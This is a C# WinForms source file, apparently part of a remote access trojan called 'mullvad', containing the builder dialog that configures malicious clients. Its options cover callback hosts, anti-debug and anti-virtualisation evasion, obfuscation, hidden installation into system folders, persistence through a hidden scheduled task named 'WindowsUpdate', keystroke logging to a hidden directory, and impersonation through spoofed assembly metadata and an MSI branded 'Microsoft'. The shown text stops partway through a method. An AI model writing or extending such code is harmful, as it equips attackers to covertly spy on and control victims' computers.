using mullvad.Build;
using mullvad.Controls;
using mullvad.Models;
using mullvad.Theme;

namespace mullvad.Forms
{
    // Double-buffered panel — eliminates flicker when repainting the sidebar
    internal class DbPanel : Panel
    {
        public DbPanel()
        {
            SetStyle(ControlStyles.UserPaint | ControlStyles.AllPaintingInWmPaint |
                     ControlStyles.OptimizedDoubleBuffer, true);
        }
    }

    public class BuilderForm : Form
    {
        // ── Sidebar constants ─────────────────────────────────────────────────
        private const int SideW = 136;
        private const int ItemH = 34;

        private static Color C_Bg      => ThemeManager.Current == AppTheme.Dark ? Color.FromArgb(37, 37, 38)  : Color.FromArgb(242, 242, 242);
        private static Color C_Divider => ThemeManager.Current == AppTheme.Dark ? Color.FromArgb(60, 60, 60)  : Color.FromArgb(210, 210, 210);
        private static Color C_SelBg   => ThemeManager.Current == AppTheme.Dark ? Color.FromArgb(55, 55, 56)  : Color.FromArgb(226, 226, 226);
        private static Color C_SelBar  => ThemeManager.Current == AppTheme.Dark ? Color.FromArgb(0,  122, 204) : Color.FromArgb(30,  30,  30);
        private static Color C_NavFg   => ThemeManager.Current == AppTheme.Dark ? Color.FromArgb(212, 212, 212) : Color.FromArgb(60,  60,  70);

        private static readonly string[] NavLabels =
        {
            "General Settings", "Protection Settings", "Connection Settings",
            "Installation Settings", "Post Install Settings", "MSI Settings",
            "Assembly Settings", "Notify Settings",
        };

        private const int MsiPageIndex = 5;

        // ── Sidebar state ─────────────────────────────────────────────────────
        private int _selIdx = 0;
        private int _hotIdx = -1;

        // ── Panels ────────────────────────────────────────────────────────────
        private DbPanel pnlSide    = null!;
        private Panel[] pages      = null!;

        // ── General ───────────────────────────────────────────────────────────
        private TextBox  txtTag = null!, txtMutex = null!;
        private Button   btnMutex = null!;
        private CheckBox chkRequireAdmin = null!, chkDebugConsole = null!;

        // ── Protection ────────────────────────────────────────────────────────
        private CheckBox chkAntiDebug = null!, chkAntiTamper = null!, chkAntiVirtual = null!;
        private CheckBox chkObfuscation = null!, chkEncrypted = null!, chkNativeAot = null!;

        // ── MSI ───────────────────────────────────────────────────────────────
        private TextBox  txtMsiProductName = null!, txtMsiManufacturer = null!;
        private CheckBox chkMsiAutoRun = null!;

        // ── Connection ────────────────────────────────────────────────────────
        private ListBox       lstHosts = null!;
        private TextBox       txtHost  = null!;
        private NumericUpDown numPort  = null!, numDelay = null!;
        private Button        btnAddHost = null!;

        // ── Installation ──────────────────────────────────────────────────────
        private CheckBox    chkInstall = null!, chkHide = null!, chkHideSubDir = null!;
        private CheckBox    chkStartup = null!, chkTaskScheduler = null!;
        private RadioButton rbAppdata  = null!, rbProgramFiles = null!, rbSystem = null!;
        private TextBox     txtInstallSub = null!, txtInstallName = null!, txtStartupName = null!;
        private TextBox     txtPreviewPath = null!;
        private Button      btnConfigTaskScheduler = null!;

        // ── Task Scheduler config (backing store for TaskSchedulerForm dialog) ─
        private string _taskName         = "WindowsUpdate";
        private int    _taskTrigger      = 0;
        private int    _taskInterval     = 30;
        private bool   _taskHighestPriv  = false;
        private bool   _taskLoggedOff    = false;
        private bool   _taskHidden       = false;
        private bool   _taskRestart      = false;

        // ── Post-install ──────────────────────────────────────────────────────
        private CheckBox chkKeylogger = null!, chkHideLogDir = null!;
        private TextBox  txtLogDir    = null!;

        // ── Assembly ──────────────────────────────────────────────────────────
        private CheckBox   chkChangeAsmInfo = null!, chkChangeIcon = null!;
        private TextBox    txtProductName = null!, txtDescription   = null!;
        private TextBox    txtCompanyName = null!, txtCopyright     = null!;
        private TextBox    txtTrademarks  = null!, txtOriginalFilename = null!;
        private TextBox    txtProductVersion = null!, txtFileVersion = null!;
        private TextBox    txtIconPath    = null!;
        private Button     btnBrowseIcon  = null!;
        private PictureBox picIcon        = null!;

        // ── Bottom ────────────────────────────────────────────────────────────
        private SegmentedToggle fmtToggle       = null!;
        private Button          btnBuild        = null!;
        private Button          btnOpenOutput   = null!;
        internal static string? _lastOutputPath;

        // ─────────────────────────────────────────────────────────────────────
        public BuilderForm()
        {
            InitializeComponent();
            LoadProfile();
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            ThemeManager.ApplyForm(this);
            ThemeManager.ThemeChanged += OnThemeChanged;
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            ThemeManager.ThemeChanged -= OnThemeChanged;
            base.OnFormClosed(e);
        }

        private void OnThemeChanged()
        {
            if (IsDisposed) return;
            if (InvokeRequired) { BeginInvoke(OnThemeChanged); return; }
            ThemeManager.ApplyForm(this);
            pnlSide.Invalidate();
        }

        // ─────────────────────────────────────────────────────────────────────
        //  InitializeComponent
        // ─────────────────────────────────────────────────────────────────────
        private void InitializeComponent()
        {
            SuspendLayout();

            Text            = "Client Builder";
            ClientSize      = new Size(580, 430);
            FormBorderStyle = FormBorderStyle.FixedDialog;
            MaximizeBox     = false;
            MinimizeBox     = false;
            Font            = new Font("Segoe UI", 8.25f);
            ShowInTaskbar   = false;
            StartPosition   = FormStartPosition.CenterParent;
            BackColor       = SystemColors.Control;

            // ── Bottom bar ───────────────────────────────────────────────────
            var bottom = new Panel
            {
                Dock      = DockStyle.Bottom,
                Height    = 40,
                BackColor = SystemColors.Control,
            };
            bottom.Paint += (s, e) =>
                e.Graphics.DrawLine(new Pen(C_Divider), 0, 0, ((Control)s!).Width, 0);

            fmtToggle = new SegmentedToggle("EXE", "BAT", "MSI")
            {
                Size = new Size(138, 23),
                Font = new Font("Segoe UI", 8.25f),
            };
            fmtToggle.SelectedChanged += OnFormatChanged;
            btnOpenOutput = new Button
            {
                Text              = "Open Output Folder",
                Size              = new Size(140, 23),
                Font              = new Font("Segoe UI", 8.25f),
                TextImageRelation = TextImageRelation.ImageBeforeText,
                ImageAlign        = ContentAlignment.MiddleLeft,
                Image             = IconLoader.Load("folder.png"),
            };
            btnOpenOutput.Click += OnOpenOutputClick;
            bottom.Controls.Add(btnOpenOutput);

            btnBuild = new Button
            {
                Text              = "Build",
                Size              = new Size(72, 23),
                Font = new Font("Segoe UI", 8.25f),
            };
            btnBuild.Click += OnBuildClick;
            bottom.Controls.Add(fmtToggle);
            bottom.Controls.Add(btnBuild);
            bottom.Resize += (_, _) =>
            {
                int cy = (bottom.Height - 23) / 2;
                btnOpenOutput.Location = new Point(8, cy);
                btnBuild.Location      = new Point(bottom.Width - btnBuild.Width - 8, cy);
                fmtToggle.Location     = new Point(btnBuild.Left - fmtToggle.Width - 6, cy);
            };

            // ── Sidebar panel ────────────────────────────────────────────────
            pnlSide = new DbPanel
            {
                Dock      = DockStyle.Left,
                Width     = SideW,
                BackColor = C_Bg,
            };
            pnlSide.Paint     += OnSidePaint;
            pnlSide.MouseMove += OnSideMouseMove;
            pnlSide.MouseLeave += (_, _) => { _hotIdx = -1; pnlSide.Invalidate(); };
            pnlSide.MouseClick += OnSideClick;

            // ── Vertical divider between sidebar and content ─────────────────
            var vline = new Panel
            {
                Dock      = DockStyle.Left,
                Width     = 1,
                BackColor = C_Divider,
            };

            // ── Content panels ────────────────────────────────────────────────
            pages = new Panel[NavLabels.Length];
            for (int i = 0; i < pages.Length; i++)
            {
                pages[i] = new Panel
                {
                    Dock      = DockStyle.Fill,
                    BackColor = SystemColors.Control,
                    Visible   = i == 0,
                    AutoScroll = true,
                };
            }

            BuildGeneralPage(pages[0]);
            BuildProtectionPage(pages[1]);
            BuildConnectionPage(pages[2]);
            BuildInstallPage(pages[3]);
            BuildPostInstallPage(pages[4]);
            BuildMsiPage(pages[5]);
            BuildAssemblyPage(pages[6]);
            BuildNotifyPage(pages[7]);

            UpdateMsiTabVisibility();

            // Content host (right of sidebar)
            var host = new Panel { Dock = DockStyle.Fill };
            foreach (var pg in pages) host.Controls.Add(pg);

            Controls.Add(host);
            Controls.Add(vline);
            Controls.Add(pnlSide);
            Controls.Add(bottom);

            ResumeLayout(false);
            FormClosing += (_, _) => SaveProfile();
        }

        // ─────────────────────────────────────────────────────────────────────
        //  Sidebar paint & mouse
        // ─────────────────────────────────────────────────────────────────────
        private void OnSidePaint(object? sender, PaintEventArgs e)
        {
            var g = e.Graphics;
            g.FillRectangle(new SolidBrush(C_Bg), pnlSide.ClientRectangle);

            for (int i = 0; i < NavLabels.Length; i++)
            {
                var  rc       = ItemRect(i);
                bool sel      = i == _selIdx;
                bool hot      = i == _hotIdx && !sel;
                bool isNotify  = i == NavLabels.Length - 1;
                bool isMsiHidden = i == MsiPageIndex && !_msiVisible;
                bool isDisabled = isNotify || isMsiHidden;

                if (sel && !isDisabled)
                {
                    g.FillRectangle(new SolidBrush(C_SelBg), rc);
                    g.FillRectangle(new SolidBrush(C_SelBar),
                        new Rectangle(rc.X, rc.Y, 2, rc.Height));
                }
                else if (hot && !isDisabled)
                {
                    g.FillRectangle(new SolidBrush(Color.FromArgb(234, 234, 234)), rc);
                }

                using var sep = new Pen(C_Divider);
                g.DrawLine(sep, rc.X + 6, rc.Bottom - 1, rc.Right - 6, rc.Bottom - 1);

                var fg = isDisabled ? Color.FromArgb(120, 120, 130)
                       : sel        ? (ThemeManager.Current == AppTheme.Dark ? Color.FromArgb(240, 240, 240) : Color.FromArgb(20, 20, 20))
                       :              C_NavFg;
                using var font = new Font("Segoe UI", 8.0f, FontStyle.Regular);
                var textRect = new Rectangle(rc.X + 5, rc.Y, rc.Width - 8, rc.Height);
                TextRenderer.DrawText(g, NavLabels[i], font, textRect, fg,
                    TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter |
                    TextFormatFlags.WordBreak | TextFormatFlags.EndEllipsis);
            }
        }

        private Rectangle ItemRect(int i)
            => new Rectangle(0, i * ItemH, SideW, ItemH);

        private void OnSideMouseMove(object? sender, MouseEventArgs e)
        {
            int idx = e.Y / ItemH;
            if (idx >= NavLabels.Length) idx = -1;
            if (idx != _hotIdx) { _hotIdx = idx; pnlSide.Invalidate(); }
        }

        private void OnSideClick(object? sender, MouseEventArgs e)
        {
            int idx = e.Y / ItemH;
            if (idx < 0 || idx >= NavLabels.Length) return;
            if (idx == NavLabels.Length - 1) return;  // Notify — disabled
            if (idx == MsiPageIndex && !_msiVisible) return;
            if (idx == _selIdx) return;
            _selIdx = idx;
            for (int i = 0; i < pages.Length; i++) pages[i].Visible = i == _selIdx;
            pnlSide.Invalidate();
        }

        private bool _msiVisible;

        private void UpdateMsiTabVisibility()
        {
            _msiVisible = fmtToggle.SelectedIndex == 2;
            if (_selIdx == MsiPageIndex && !_msiVisible)
            {
                _selIdx = 0;
                for (int i = 0; i < pages.Length; i++) pages[i].Visible = i == _selIdx;
            }
            pnlSide.Invalidate();
        }

        private void OnFormatChanged(object? sender, EventArgs e) => UpdateMsiTabVisibility();

        // ─────────────────────────────────────────────────────────────────────
        //  Page builders
        // ─────────────────────────────────────────────────────────────────────

        private void BuildGeneralPage(Panel p)
        {
            int y = 10;
            Sec(p, "Client Identification", ref y);
            Desc(p, "You can choose a tag to identify your client in the connections list.", ref y);
            Row(p, "Client Tag:", txtTag = Tb(), ref y);

            y += 8;
            Sec(p, "Process Mutex", ref y);
            Desc(p, "A unique mutex ensures only one instance of the client runs per machine.", ref y);
            Row(p, "Mutex:", txtMutex = Tb(maxLen: 64), ref y);
            btnMutex = new Button { Text = "Random Mutex", Left = 262, Top = y, Width = 118, Height = 23 };
            btnMutex.Click += (_, _) => txtMutex.Text = Guid.NewGuid().ToString();
            p.Controls.Add(btnMutex);
            y += 28;

            y += 8;
            Sec(p, "Elevation", ref y);
            Desc(p, "Require administrator privileges to run the client.", ref y);
            chkRequireAdmin = new CheckBox { Text = "Run with Administrator", Left = 20, Top = y, AutoSize = true };
            p.Controls.Add(chkRequireAdmin);
            var picShield = new PictureBox { Left = 214, Top = y, Width = 16, Height = 16, SizeMode = PictureBoxSizeMode.StretchImage };
            picShield.Image = IconLoader.Load("uac_shield.png") ?? SystemIcons.Shield.ToBitmap();
            p.Controls.Add(picShield);
            y += 24;

            y += 8;
            Sec(p, "Debug Console", ref y);
            Desc(p, "Shows the client console window for debugging.", ref y);
            Chk(p, chkDebugConsole = new CheckBox { Text = "Show debug console" }, ref y);
        }

        private void BuildProtectionPage(Panel p)
        {
            int y = 10;
            Sec(p, "Anti Protection", ref y);
            Chk(p, chkAntiDebug   = new CheckBox { Text = "Anti-Debug" },   ref y);
            Chk(p, chkAntiTamper  = new CheckBox { Text = "Anti-Tamper" },  ref y);
            Chk(p, chkAntiVirtual = new CheckBox { Text = "Anti-Virtual" }, ref y);

            y += 8;
            Sec(p, "Miscellaneous", ref y);
            Chk(p, chkObfuscation = new CheckBox { Text = "Obfuscation", Checked = true }, ref y);
            Chk(p, chkEncrypted   = new CheckBox { Text = "Encrypted" },                   ref y);
            Chk(p, chkNativeAot   = new CheckBox { Text = "Native AOT", Checked = true },  ref y);
        }

        private void BuildConnectionPage(Panel p)
        {
            int y = 10;
            Sec(p, "Connection Hosts", ref y);

            lstHosts = new ListBox { Left = 20, Top = y, Width = 149, Height = 121 };
            var ctx      = new ContextMenuStrip();
            var miRemove = new ToolStripMenuItem("Remove host");
            TryMenuIcon(miRemove, "delete.png", "cancel.png");
            miRemove.Click += (_, _) => { if (lstHosts.SelectedIndex >= 0) lstHosts.Items.RemoveAt(lstHosts.SelectedIndex); };
            var miClear  = new ToolStripMenuItem("Clear all");
            TryMenuIcon(miClear,  "cancel.png", "delete.png");
            miClear.Click  += (_, _) => lstHosts.Items.Clear();
            ctx.Items.Add(miRemove);
            ctx.Items.Add(miClear);
            lstHosts.ContextMenuStrip = ctx;
            p.Controls.Add(lstHosts);

            Lbl(p, "IP/Hostname:", 175, y + 4);
            txtHost = new TextBox { Left = 254, Top = y, Width = 129, Height = 22 };
            p.Controls.Add(txtHost);

            Lbl(p, "Port:", 175, y + 30);
            numPort = new NumericUpDown { Left = 254, Top = y + 28, Width = 129, Height = 22, Minimum = 1, Maximum = 65535, Value = 7777 };
            p.Controls.Add(numPort);

            btnAddHost = new Button { Text = "Add Host", Left = 254, Top = y + 56, Width = 129, Height = 22 };
            btnAddHost.Click += OnAddHost;
            p.Controls.Add(btnAddHost);

            y += 130;
            y += 8;
            Sec(p, "Reconnect Delay", ref y);
            Desc(p, "Time to wait between reconnect tries:", ref y);
            numDelay = new NumericUpDown { Left = 276, Top = y, Width = 80, Minimum = 0, Maximum = 600000, Value = 5000 };
            p.Controls.Add(numDelay);
            Lbl(p, "ms", 362, y + 4);
        }

        private void BuildInstallPage(Panel p)
        {
            int y = 10;
            Sec(p, "Installation Location", ref y);
            Chk(p, chkInstall = new CheckBox { Text = "Install Client" }, ref y);
            chkInstall.CheckedChanged += OnInstallChanged;

            Lbl(p, "Install Directory:", 20, y + 2);
            rbAppdata      = new RadioButton { Text = "User Application Data", Left = 241, Top = y,      Width = 155, Checked = true };
            rbProgramFiles = new RadioButton { Text = "Program Files",         Left = 241, Top = y + 23, Width = 130 };
            rbSystem       = new RadioButton { Text = "System",                Left = 241, Top = y + 46, Width = 80 };
            p.Controls.AddRange(new Control[] { rbAppdata, rbProgramFiles, rbSystem });
            y += 70;

            Lbl(p, "Install Subdirectory:", 20, y + 3);
            txtInstallSub  = new TextBox { Left = 182, Top = y, Width = 201, Height = 22, Text = "mullvad" };
            p.Controls.Add(txtInstallSub);
            y += 28;

            Lbl(p, "Install Name:", 20, y + 3);
            txtInstallName = new TextBox { Left = 182, Top = y, Width = 170, Height = 22, Text = "client" };
            p.Controls.Add(txtInstallName);
            Lbl(p, ".exe", 356, y + 3);
            y += 28;

            chkHide       = new CheckBox { Text = "Set file attributes to hidden",   Left = 20,  Top = y, AutoSize = true };
            chkHideSubDir = new CheckBox { Text = "Set subdir attributes to hidden", Left = 186, Top = y, AutoSize = true };
            p.Controls.AddRange(new Control[] { chkHide, chkHideSubDir });
            y += 26;

            Lbl(p, "Installation Location Preview:", 20, y + 3);
            y += 22;
            txtPreviewPath = new TextBox { Left = 20, Top = y, Width = 363, Height = 22, ReadOnly = true, BackColor = SystemColors.Control };
            p.Controls.Add(txtPreviewPath);
            y += 30;

            y += 8;
            Sec(p, "Autostart", ref y);
            Chk(p, chkStartup = new CheckBox { Text = "Run Client when the computer starts" }, ref y);

            Lbl(p, "Startup Name:", 20, y + 3);
            txtStartupName = new TextBox { Left = 182, Top = y, Width = 201, Height = 22, Text = "mullvad" };
            p.Controls.Add(txtStartupName);
            y += 28;

            chkTaskScheduler = new CheckBox { Text = "Enable Task Scheduler", Left = 20, Top = y, AutoSize = true };
            chkTaskScheduler.CheckedChanged += (_, _) =>
                btnConfigTaskScheduler.Enabled = chkInstall.Checked && chkTaskScheduler.Checked;
            btnConfigTaskScheduler = new Button { Text = "Configure...", Left = 182, Top = y - 1, Width = 86, Height = 22 };
            btnConfigTaskScheduler.Click += OnConfigTaskScheduler;
            p.Controls.AddRange(new Control[] { chkTaskScheduler, btnConfigTaskScheduler });
            y += 24;

            void Upd(object? s, EventArgs ev)
            {
                string b = rbAppdata.Checked      ? @"%AppData%"
                         : rbProgramFiles.Checked ? @"%ProgramFiles%"
                         : @"%SystemRoot%\system32";
                txtPreviewPath.Text = $@"{b}\{txtInstallSub.Text}\{txtInstallName.Text}.exe";
            }
            txtInstallSub.TextChanged     += Upd;
            txtInstallName.TextChanged    += Upd;
            rbAppdata.CheckedChanged      += Upd;
            rbProgramFiles.CheckedChanged += Upd;
            rbSystem.CheckedChanged       += Upd;
            Upd(null, EventArgs.Empty);
            OnInstallChanged(null, EventArgs.Empty);
        }

        private void BuildPostInstallPage(Panel p)
        {
            int y = 10;
            Sec(p, "Monitoring", ref y);
            Chk(p, chkKeylogger = new CheckBox { Text = "Enable keyboard logging" }, ref y);

            Lbl(p, "Log Directory Name:", 20, y + 3);
            txtLogDir = new TextBox { Left = 262, Top = y, Width = 118, Height = 22, Text = "Logs" };
            p.Controls.Add(txtLogDir);
            y += 28;

            Chk(p, chkHideLogDir = new CheckBox { Text = "Set directory attributes to hidden" }, ref y);

            chkKeylogger.CheckedChanged += (_, _) =>
            {
                txtLogDir.Enabled     = chkKeylogger.Checked;
                chkHideLogDir.Enabled = chkKeylogger.Checked;
            };
            txtLogDir.Enabled     = false;
            chkHideLogDir.Enabled = false;
        }

        private void BuildMsiPage(Panel p)
        {
            int y = 10;
            Sec(p, "MSI Installer", ref y);
            Desc(p, "Configure the Windows Installer package (.msi) output.", ref y);

            Row(p, "Product Name:", txtMsiProductName = Tb("Windows Service"), ref y);
            Row(p, "Manufacturer:", txtMsiManufacturer = Tb("Microsoft"), ref y);

            y += 8;
            Sec(p, "Post-Install Behavior", ref y);
            Chk(p, chkMsiAutoRun = new CheckBox { Text = "Run client immediately after install", Checked = true }, ref y);
        }

        private void BuildAssemblyPage(Panel p)
        {
            int y = 10;
            Sec(p, "Assembly Information", ref y);
            Chk(p, chkChangeAsmInfo = new CheckBox { Text = "Change Assembly Information" }, ref y);
            chkChangeAsmInfo.CheckedChanged += OnAsmInfoChanged;

            Row(p, "Product Name:",      txtProductName      = Tb(), ref y);
            Row(p, "Description:",       txtDescription      = Tb(), ref y);
            Row(p, "Company Name:",      txtCompanyName      = Tb(), ref y);
            Row(p, "Copyright:",         txtCopyright        = Tb(), ref y);
            Row(p, "Trademarks:",        txtTrademarks       = Tb(), ref y);
            Row(p, "Original Filename:", txtOriginalFilename = Tb(), ref y);
            Row(p, "Product Version:",   txtProductVersion   = Tb("1.0.0.0"), ref y);
            Row(p, "File Version:",      txtFileVersion      = Tb("1.0.0.0"), ref y);

            y += 8;
            Sec(p, "Assembly Icon", ref y);
            Chk(p, chkChangeIcon = new CheckBox { Text = "Change Assembly Icon" }, ref y);
            chkChangeIcon.CheckedChanged += OnIconChanged;

            txtIconPath   = new TextBox { Left = 20, Top = y, Width = 282, Height = 22 };
            p.Controls.Add(txtIconPath);
            btnBrowseIcon = new Button { Text = "Browse...", Left = 177, Top = y + 28, Width = 125, Height = 23 };
            btnBrowseIcon.Click += OnBrowseIcon;
            p.Controls.Add(btnBrowseIcon);
            picIcon = new PictureBox { Left = 319, Top = y - 8, Width = 64, Height = 64,
                                       SizeMode = PictureBoxSizeMode.StretchImage,
                                       BorderStyle = BorderStyle.FixedSingle };
            p.Controls.Add(picIcon);

            OnAsmInfoChanged(null, EventArgs.Empty);
            OnIconChanged(null, EventArgs.Empty);
        }

        private static void BuildNotifyPage(Panel p)
        {
            p.Controls.Add(new Label
            {
                Text      = "Notify settings will be available in a future release.",
                Dock      = DockStyle.Fill,
                TextAlign = ContentAlignment.MiddleCenter,
                ForeColor = SystemColors.GrayText,
                Font      = new Font("Segoe UI", 8.25f, FontStyle.Italic),
            });
        }

        // ─────────────────────────────────────────────────────────────────────
        //  Event handlers
        // ─────────────────────────────────────────────────────────────────────

        private void OnAddHost(object? sender, EventArgs e)
        {
            var h = txtHost.Text.Trim();
            if (!string.IsNullOrEmpty(h))
            {
                lstHosts.Items.Add($"{h}:{(int)numPort.Value}");
                txtHost.Clear();
            }
        }

        private void OnInstallChanged(object? sender, EventArgs e)
        {
            bool on = chkInstall.Checked;
            foreach (var c in new Control[]
                { rbAppdata, rbProgramFiles, rbSystem, txtInstallSub, txtInstallName,
                  chkHide, chkHideSubDir, chkStartup, txtStartupName, chkTaskScheduler })
                c.Enabled = on;
            btnConfigTaskScheduler.Enabled = on && chkTaskScheduler.Checked;
        }

        private void OnConfigTaskScheduler(object? sender, EventArgs e)
        {
            using var dlg = new TaskSchedulerForm
            {
                TaskName              = _taskName,
                TaskTrigger           = _taskTrigger,
                TaskIntervalMinutes   = _taskInterval,
                TaskHighestPrivileges = _taskHighestPriv,
                TaskLoggedOffRun      = _taskLoggedOff,
                TaskHidden            = _taskHidden,
                TaskRestartOnFailure  = _taskRestart,
            };
            if (dlg.ShowDialog(this) != DialogResult.OK) return;
            _taskName        = dlg.TaskName;
            _taskTrigger     = dlg.TaskTrigger;
            _taskInterval    = dlg.TaskIntervalMinutes;
            _taskHighestPriv = dlg.TaskHighestPrivileges;
            _taskLoggedOff   = dlg.TaskLoggedOffRun;
            _taskHidden      = dlg.TaskHidden;
            _taskRestart     = dlg.TaskRestartOnFailure;
        }

        private void OnAsmInfoChanged(object? sender, EventArgs e)
        {
            bool on = chkChangeAsmInfo.Checked;
            foreach (var c in new Control[]
                { txtProductName, txtDescription, txtCompanyName, txtCopyright,
                  txtTrademarks, txtOriginalFilename, txtProductVersion, txtFileVersion })
                c.Enabled = on;
        }

        private void OnIconChanged(object? sender, EventArgs e)
        {
            bool on = chkChangeIcon.Checked;
            txtIconPath.Enabled   = on;
            btnBrowseIcon.Enabled = on;
        }

        private void OnBrowseIcon(object? sender, EventArgs e)
        {
            using var dlg = new OpenFileDialog { Filter = "Icons (*.ico)|*.ico" };
            if (dlg.ShowDialog() != DialogResult.OK) return;
            txtIconPath.Text = dlg.FileName;
            try { picIcon.Image = new Icon(dlg.FileName).ToBitmap(); } catch { picIcon.Image = null; }
        }

        private void OnOpenOutputClick(object? sender, EventArgs e)
        {
            var folder = _lastOutputPath is not null
                ? System.IO.Path.GetDirectoryName(_lastOutputPath)
                : null;
            if (folder == null || !System.IO.Directory.Exists(folder))
            {
                MessageBox.Show("No output folder yet. Build first.", "Open Output Folder",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
            {
                FileName        = folder,
                UseShellExecute = true,
            });
        }

        private void OnBuildClick(object? sender, EventArgs e)
        {
            int fmt = fmtToggle.SelectedIndex;
            string filter = fmt switch
            {
                1 => "Batch File (*.bat)|*.bat",
                2 => "Windows Installer (*.msi)|*.msi",
                _ => "Executable (*.exe)|*.exe",
            };
            string ext = fmt switch { 1 => ".bat", 2 => ".msi", _ => ".exe" };
            using var save = new SaveFileDialog
            {
                Filter   = filter,
                FileName = "client" + ext,
            };
            if (save.ShowDialog() != DialogResult.OK) return;

            var opt = CollectOptions(save.FileName);
            if (opt.Hosts.Count == 0)
            {
                MessageBox.Show("Add at least one host before building.",
                    "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            btnBuild.Enabled = false; btnBuild.Text = "Building...";
            Task.Run(() =>
            {
                try
                {
                    ClientBuilder.Build(opt);
                    Invoke(() =>
                    {
                        _lastOutputPath = opt.OutputPath;
                        MessageBox.Show($"Build successful!\n\n{opt.OutputPath}",
                            "Build Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    });
                }
                catch (Exception ex)
                {
                    Invoke(() => MessageBox.Show($"Build failed:\n\n{ex.Message}",
                        "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error));
                }
                finally { Invoke(() => { btnBuild.Enabled = true; btnBuild.Text = "Build"; }); }
            });
        }

        private BuildOptions CollectOptions(string outputPath)
        {
            var o = new BuildOptions { OutputPath = outputPath };
            o.Hosts.Clear();
            foreach (var item in lstHosts.Items)
            {
                var entry = item.ToString()!;
                int colon = entry.LastIndexOf(':');
                o.Hosts.Add(colon > 0 ? entry.Substring(0, colon) : entry);
            }
            o.Port              = (int)numPort.Value;
            o.ReconnectDelay    = (int)numDelay.Value;
            o.Tag               = txtTag.Text.Trim();
            o.Mutex             = txtMutex.Text.Trim();
            o.RequireAdmin      = chkRequireAdmin.Checked;
            o.DebugConsole      = chkDebugConsole.Checked;
            o.AntiDebug         = chkAntiDebug.Checked;
            o.AntiTamper        = chkAntiTamper.Checked;
            o.AntiVirtual       = chkAntiVirtual.Checked;
            o.Obfuscation       = chkObfuscation.Checked;
            o.Encrypted         = chkEncrypted.Checked;
            o.NativeAot         = chkNativeAot.Checked;
            o.Install           = chkInstall.Checked;
            o.InstallPath       = rbAppdata.Checked ? 1 : rbProgramFiles.Checked ? 2 : 3;
            o.InstallSubDirectory = txtInstallSub.Text.Trim();
            o.InstallName       = txtInstallName.Text.Trim();
            o.HideFile          = chkHide.Checked;
            o.HideSubDirectory  = chkHideSubDir.Checked;
            o.Startup           = chkStartup.Checked;
            o.StartupName       = txtStartupName.Text.Trim();
            o.UseTaskScheduler        = chkTaskScheduler.Checked;
            o.TaskName                = _taskName;
            o.TaskTrigger             = _taskTrigger;
            o.TaskIntervalMinutes     = _taskInterval;
            o.TaskHighestPrivileges   = _taskHighestPriv;
            o.TaskLoggedOffRun        = _taskLoggedOff;
            o.TaskHidden              = _taskHidden;
            o.TaskRestartOnFailure    = _taskRestart;
            o.Keylogger               = chkKeylogger.Checked;
            o.LogDirectoryName  = txtLogDir.Text.Trim();
            o.HideLogDirectory  = chkHideLogDir.Checked;
            o.ChangeAsmInfo     = chkChangeAsmInfo.Checked;
            o.ProductName       = txtProductName.Text;
            o.Description       = txtDescription.Text;
            o.CompanyName       = txtCompanyName.Text;
            o.Copyright         = txtCopyright.Text;
            o.Trademarks        = txtTrademarks.Text;
            o.OriginalFilename  = txtOriginalFilename.Text;
            o.ProductVersion    = txtProductVersion.Text;
            o.FileVersion       = txtFileVersion.Text;
            o.ChangeIcon        = chkChangeIcon.Checked;
            o.IconPath          = txtIconPath.Text;
            o.MsiProductName    = txtMsiProductName.Text.Trim();
            o.MsiManufacturer   = txtMsiManufacturer.Text.Trim();
            o.MsiAutoRun        = chkMsiAutoRun.Checked;
            return o;
        }

        // ─────────────────────────────────────────────────────────────────────
        //  Profile
        // ─────────────────────────────────────────────────────────────────────

        private void LoadProfile()
        {
            var o = BuilderProfile.LoadOptions("Default");
            lstHosts.Items.Clear();
            foreach (var h in o.Hosts) lstHosts.Items.Add($"{h}:{o.Port}");
            numPort.Value           = o.Port;
            numDelay.Value          = o.ReconnectDelay;
            txtTag.Text             = o.Tag;
            txtMutex.Text           = o.Mutex;
            if (string.IsNullOrEmpty(txtMutex.Text) || txtMutex.Text == "mullvad_default_mutex")
                txtMutex.Text = Guid.NewGuid().ToString("N");
            chkRequireAdmin.Checked = o.RequireAdmin;
            chkDebugConsole.Checked = o.DebugConsole;
            chkAntiDebug.Checked    = o.AntiDebug;
            chkAntiTamper.Checked   = o.AntiTamper;
            chkAntiVirtual.Checked  = o.AntiVirtual;
            chkObfuscation.Checked  = o.Obfuscation;
            chkEncrypted.Checked    = o.Encrypted;
            chkNativeAot.Checked    = o.NativeAot;
            chkInstall.Checked      = o.Install;
            rbAppdata.Checked       = o.InstallPath == 1;
            rbProgramFiles.Checked  = o.InstallPath == 2;
            rbSystem.Checked        = o.InstallPath == 3;
            txtInstallSub.Text      = o.InstallSubDirectory;
            txtInstallName.Text     = o.InstallName;
            chkHide.Checked         = o.HideFile;
            chkHideSubDir.Checked   = o.HideSubDirectory;
            chkStartup.Checked      = o.Startup;
            txtStartupName.Text     = o.StartupName;
            chkTaskScheduler.Checked = o.UseTaskScheduler;
            _taskName        = o.TaskName;
            _taskTrigger     = o.TaskTrigger;
            _taskInterval    = o.TaskIntervalMinutes;
            _taskHighestPriv = o.TaskHighestPrivileges;
            _taskLoggedOff   = o.TaskLoggedOffRun;
            _taskHidden      = o.TaskHidden;
            _taskRestart     = o.TaskRestartOnFailure;
            chkKeylogger.Checked    = o.Keylogger;
            txtLogDir.Text          = o.LogDirectoryName;
            chkHideLogDir.Checked   = o.HideLogDirectory;
            chkChangeAsmInfo.Checked= o.ChangeAsmInfo;
            txtProductName.Text     = o.ProductName;
            txtDescription.Text     = o.Description;
            txtCompanyName.Text     = o.CompanyName;
            txtCopyright.Text       = o.Copyright;
            txtTrademarks.Text      = o.Trademarks;
            txtOriginalFilename.Text= o.OriginalFilename;
            txtProductVersion.Text  = o.ProductVersion;
            txtFileVersion.Text     = o.FileVersion;
            chkChangeIcon.Checked   = o.ChangeIcon;
            txtIconPath.Text        = o.IconPath;
            txtMsiProductName.Text  = o.MsiProductName;
            txtMsiManufacturer.Text = o.MsiManufacturer;
            chkMsiAutoRun.Checked   = o.MsiAutoRun;
